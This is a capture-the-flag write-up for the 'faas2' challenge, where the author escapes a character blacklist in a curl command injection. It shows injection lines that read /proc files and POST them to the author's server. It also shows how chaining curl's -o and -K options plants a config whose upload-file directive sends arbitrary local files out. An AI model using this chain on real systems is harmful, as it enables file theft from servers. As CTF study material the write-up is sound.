# FaaS2 — CTF Writeup (Unintended)


The second version of the challenge, `faas2`, was kinda similar to the precedent one, `faas1.5` version, but with more restrictive blacklist.

The characters that were banned:

```text
;&|`$(){}<>\"'*?[]#!~1
```

The strings `self` and `file` were also banned.

The remote server, once i leaked it, eventually revealed that the application was executing this command:

```bash
curl -s -L --max-time 10 http://%s 2>/dev/null
```

The challenge's objective was to read the flag, whose filename was hidden. The executable itself also had a secret name.

To start, I first set up a small python HTTP server supporting `GET`, `PUT`, and `POST` requests. It simply printed the raw requests it received in bytes and hex, nothing more, then I exposed it through a Cloudflare tunnel.

---

## Initial Enumeration

I started with a fresh server, not touched/requests done; This was done to preserve the PID order, by guessing that `system()` was used and that could add some entropy.

From a fresh start, the first thing that I was looking for to read was `/proc/sys/kernel/ns_last_pid`, which contains the PID most recently allocated by the kernel. 

To take a look inside, I used a command injection to request it from my server as POST data:

```bash
YOUR_HOST -d @/proc/sys/kernel/ns_last_pid
```

Once I had the highest recently used PID, I worked backwards through `/proc/<pid>/cmdline`. By doing a simple math, it was like 1 or 2 PID behid:

```bash
YOUR_HOST -d @/proc/<pid>/cmdline
```

Eventually, I found the process corresponding to the challenge executable at offset 7.

The binary was named:

```text
secretbinary1337
```

and by reading the Dockerfile, was running from:

```text
/srv/secretbinary1337
```

At this point, I knew the name and location of the executable.

---

## Finding the Flag Filename

Looking at the provided C code, I noticed that the flag was read from a file whose name was hidden as mentioned:

```c
FILE *ff = fopen("REDACTED.txt", "r");
fgets(flag, sizeof flag, ff);
fclose(ff);
```

Since the file was explicitly closed, checking open file descriptors wouldn't be useful in any way. Instead, I checked the process' mount table:

```bash
YOUR_HOST -d @/proc/<pid>/mounts
```

Interestingly, the output contained a dedicated mount for the secret:

```text
tmpfs /srv/what_even_is_this_file_name.txt tmpfs ro,relatime,inode64 0 0
```

> **Note:** the flag file was apparently mounted separately into the container as a read-only `tmpfs`. This could be due to the flag being generated for each instance and then mounted as a read-only `tmpfs`, but I'm not entirely sure why the flag was here. Welp, unintentional as a path. My theory is that this actual docker was inside another container-ish environment that, with the press of the button from the website, generated flag and mounted it in this one.


Since `/proc/<pid>/mounts` exposes the mount points visible to the process, this revealed the flag's filename:

```text
what_even_is_this_file_name.txt
```

At this point I had:

```text
/srv/secretbinary1337
/srv/what_even_is_this_file_name.txt
```

The problem was getting the actual contents by not having the blacklist shutting me off.

---

## The Blacklist Bypass

The usual approaches were mostly useless because of the number of blocked characters and strings. Instead of trying to find some shell parsing or an allowed-character combination, I started thinking about ways to indirectly interact with the remote system via `curl`.

I knew the remote application was executing something along the lines of:

```c
system("curl http://HOST");
```

So I checked the `curl` manual and found two particularly options:

* `-o` — save the response body to a file
* `-K` — load additional options from a configuration file

`curl` can load extra command-line options from a file. If I could somehow create a file on the target, I could make `curl` perform actions that would otherwise be blocked by the blacklist.

### Creating and injecting the config file

I configured my HTTP server to return the following body:

```text
upload-file = /srv/secretbinary1337
```

Then I used `curl`'s output option to save that response directly to a file:

```bash
YOUR_HOST -o /tmp/x
```

This gave me a configuration file at:

```text
/tmp/x
```

containing:

```text
upload-file = /srv/secretbinary1337
```

To check if it worked, i did:
```bash
YOUR_HOST -d @/tmp/x
```

Which responded with the correct content.

Then i sent:

```bash
YOUR_HOST -K /tmp/x
```

At this point, `curl` interpreted the contents of `/tmp/x` as configuration options. The `upload-file` directive caused it to upload the ELF binary to my HTTP server via a PUT request.

I bypassed the blacklist.

---

## Getting the Flag

Once I confirmed that the technique worked, getting the flag was straightforward.

I changed the response body served by my HTTP server to:

```text
upload-file = /srv/what_even_is_this_file_name.txt
```

Then I repeated the same process:

```bash
YOUR_HOST -o /tmp/x
YOUR_HOST -K /tmp/x
```

This time, I received the flag file.

---

## Conclusion

The basic chain was:

```text
/proc/sys/kernel/ns_last_pid
        ↓
find challenge PID
        ↓
/proc/<pid>/cmdline
        ↓
find secretbinary1337
        ↓
/proc/<pid>/mounts
        ↓
find flag filename
        ↓
curl -o /tmp/x
        ↓
create curl config file
        ↓
curl -K /tmp/x
        ↓
upload arbitrary local file
        ↓
receive it on my HTTP server
```

The interesting part of the exploit is that `curl` itself became the primitive used to bypass the blacklist. By alternating between `-o` and `-K`, I could effectively create arbitrary `curl` configuration files.

In practice, this meant I could read arbitrary files accessible to the process, not just the flag. Depending on which `curl` options were available and the permissions of the target process, the same technique could potentially be extended to overwrite files as well.

---

> **Thanks for reading!**  
> *GreyHat, il gatto con la lupara*
